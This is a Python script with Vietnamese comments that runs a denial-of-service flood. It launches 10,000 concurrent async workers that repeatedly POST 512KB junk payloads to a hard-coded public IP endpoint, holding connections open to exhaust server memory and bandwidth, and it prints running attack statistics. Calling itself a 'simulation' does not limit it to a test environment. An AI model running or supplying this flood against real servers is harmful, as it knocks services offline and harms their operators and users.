import asyncio
import aiohttp
import time
import random
import logging

# --- CẤU HÌNH MỤC TIÊU CỰC ĐOAN ---
TARGET_URL = "http://203.171.20.94/api/v1/process" 
MAX_CONCURRENT_CONNECTIONS = 10000  # Con số mục tiêu của bạn
TIMEOUT_SECONDS = 5                 # Thời gian chờ phản hồi

# --- CẤU HÌNH PAYLOAD KHỦNG ---
# Tăng kích thước payload lên mức cực đại để gây áp lực RAM/Bandwidth
PAYLOAD_SIZE = 1024 * 512  # 512KB mỗi request

# --- THỐNG KÊ ---
stats = {
    "total_sent": 0,
    "success": 0,
    "failed": 0,
    "timeouts": 0,
    "start_time": time.time()
}

logging.basicConfig(level=logging.INFO, format='%(message)s')
logger = logging.getLogger("DeepHat-Extreme-Massive")

async def extreme_slow_worker(worker_id):
    """
    Worker mô phỏng tấn công chiếm dụng kết nối bằng cách gửi payload lớn
    một cách chậm chạp và giữ kết nối mở.
    """
    global stats
    
    # Tạo payload cố định để tiết kiệm CPU cho máy local
    heavy_payload = b"X" * PAYLOAD_SIZE 
    
    # Sử dụng session riêng để quản lý connection pool cực lớn
    connector = aiohttp.TCPConnector(
        limit=1, 
        ttl_dns_cache=300, 
        use_dns_cache=True,
        force_close=False # Giữ kết nối mở
    )
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            stats["total_sent"] += 1
            try:
                # Sử dụng POST với dữ liệu byte lớn
                # Việc gửi payload lớn qua POST sẽ ép server phải cấp phát RAM để nhận dữ liệu
                async with session.post(
                    TARGET_URL, 
                    data=heavy_payload, 
                    timeout=TIMEOUT_SECONDS,
                    headers={
                        "Content-Type": "application/octet-stream",
                        "Connection": "keep-alive", # Yêu cầu giữ kết nối
                        "X-Attack-Mode": "Extreme-Slow-Post"
                    }
                ) as response:
                    # Đọc dữ liệu phản hồi để hoàn tất vòng đời request
                    await response.read()
                    if 200 <= response.status < 300:
                        stats["success"] += 1
                    else:
                        stats["failed"] += 1
                        
            except asyncio.TimeoutError:
                stats["timeouts"] += 1
            except aiohttp.ClientConnectorError:
                stats["failed"] += 1
            except Exception:
                stats["failed"] += 1
            
            # Nghỉ cực ngắn để duy trì áp lực nhưng không làm cháy CPU local
            await asyncio.sleep(0.05)

async def monitor():
    global stats
    while True:
        await asyncio.sleep(5) # Cập nhật mỗi 5 giây
        elapsed = time.time() - stats["start_time"]
        rps = stats["total_sent"] / elapsed if elapsed > 0 else 0
        
        print(f"\n--- [!!! EXTREME MONITOR @ {elapsed:.1f}s !!!] ---")
        print(f"Total Attempts: {stats['total_sent']}")
        print(f"Success:        {stats['success']}")
        print(f"Failed:         {stats['failed']}")
        print(f"Timeouts (!!!): {stats['timeouts']}")
        print(f"Current RPS:    {rps:.2f}")
        print(f"Success Rate:   {(stats['success']/stats['total_sent']*100 if stats['total_sent']>0 else 0):.2f}%")
        print("-" * 50)

async def main():
    print(f"[*] INITIALIZING MASSIVE ATTACK SIMULATION...")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Target Connections: {MAX_CONCURRENT_CONNECTIONS}")
    print(f"[*] Payload Size: {PAYLOAD_SIZE / 1024} KB")
    print("[!] WARNING: THIS WILL CONSUME EXTREME LOCAL RESOURCES.")
    print("=" * 50)

    # Tạo danh sách các task
    tasks = []
    
    # Chia nhỏ việc tạo task để không làm treo loop chính ngay lập tức
    for i in range(MAX_CONCURRENT_CONNECTIONS):
        tasks.append(asyncio.create_task(extreme_slow_worker(i)))
        if i % 500 == 0 and i > 0:
            print(f"[+] Spawned {i} workers...")
            await asyncio.sleep(0.1) # Cho phép loop xử lý các task đã tạo

    # Khởi tạo monitor
    tasks.append(asyncio.create_task(monitor()))
    
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped by user.")

if __name__ == "__main__":
    asyncio.run(main())